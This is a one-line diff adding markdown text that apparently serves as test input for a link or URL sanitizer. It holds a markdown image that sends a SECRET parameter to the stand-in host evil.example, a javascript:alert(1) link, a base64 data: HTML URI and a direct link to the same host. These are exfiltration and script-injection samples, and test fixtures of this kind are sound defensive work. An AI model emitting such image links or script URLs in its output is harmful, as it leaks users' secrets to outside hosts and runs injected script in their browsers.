@@ -1,0 +1,1 @@
+![x](https://evil.example/?d=SECRET) [click](javascript:alert(1)) data:text/html;base64,AAAA https://evil.example/direct
